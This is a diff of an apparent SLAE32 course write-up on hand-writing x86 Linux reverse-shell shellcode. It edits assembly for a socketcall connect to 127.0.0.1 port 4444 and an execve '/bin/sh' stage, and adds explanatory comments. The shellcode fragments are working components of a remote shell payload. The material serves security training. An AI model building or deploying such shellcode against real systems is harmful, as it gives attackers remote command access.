@@ -30,7 +30,7 @@ As follows the command line to generate the graphical diagram of the metasploit 
 
 **Result:**
 
-<img src="/assets/slae32-img/assignment2/assignment2.1.png" alt="drawing" style="max-width:100%;"/>
+<img src="/assets/slae32-img/assignment2/assignment2.1.PNG" alt="drawing" style="max-width:100%;"/>
 
 As we can see, there are 4 syscalls:
 - socket,
@@ -213,25 +213,40 @@ The return value stored in EAX should be 0x00 in case of success!
 TODO 
 **Assembly Code:**
 
-	; EBX - SYS_SOCKET call 3 for Connect
+	; EBX ; SYS_CONNECT = 3
 	xor ebx, ebx
-    mov bl, 0x3
-	; ECX
+	mov bl, 0x3
+
+	; ECX, To modify
 	; Creation of the struct sockaddr_in
-	xor edi, edi
-	push edi ; Push on the stack the IP address 0.0.0.0
-	push word 0x5c11 ; Push on the stack the port 4444 TO MODIFY IF NEEDED
-	push bx ; Push the Family AF_INET = 2
+	
+	; //////////////// Listening address ////////////
+	; Description: Set up the address to listen to
+	; Example : 
+	; 	push edi ; Push on the stack the address 0.0.0.0
+	; 	push 0x00000000 ; Same
+	push 0x0100007f ; 127.0.0.1
+
+	; /////////////// Listening port ///////////////
+	; Description : Set up the port to listen to
+	; Example : push word 0x5c11 ; Push on the stack the port 4444
+	push word 0x5c11	
+	
+	push word 0x2 ; Push the Family AF_INET = 2
 	mov ecx, esp ; mov the structure into ecx
-	; Put all parameters into ECX
+	
+	; put all parameters into ECX 
+		
 	push byte 0x10 ; Push on the stack the address length of 16
-	push ecx ; 
-	push eax ; push the file descriptor
+	push ecx
+	push esi ; push the file descriptor
 	mov ecx, esp ; Move the stack into ECX
+	
 	; EAX
 	xor eax, eax
 	mov al, 0x66
-	; bind call
+
+	; connect call
 	int 0x80
 
 
@@ -261,24 +276,32 @@ To pass the argument /bin/sh, we first converted it in hexadecimal and then reve
 
 **Assembly Code:**
 
-    ; Push the 0x00000000 on the stack
+	
+	; EXECVE /bin/sh	
+	; Push the 0x00000000 on the stack
 	xor eax, eax
 	push eax
+	
 	; put the string on the stack
-	push 0x68732f2f
-	push 0x6e69622f
-	; setup EBX with the vlue of ESP
+	push 0x68732f2f ; //sh : hs// : 68732f2f	
+	push 0x6e69622f ; /bin : nib/ : 6e69622f	
+	
+	; setup EBX with the value of ESP
 	mov ebx, esp
+
 	; set up EDX and push null bytes again
 	push eax
 	mov edx, esp
+
 	; set up ECX argv address on the first dw and null in second dw
 	push ebx 
 	; Then move the top of the stack into ECX
 	mov ecx, esp
+
 	; EAX
 	mov al, 0xb
 	int 0x80
+	
 
 
 ###  <span style="color:#2d8fb3;"> Compilation </span>
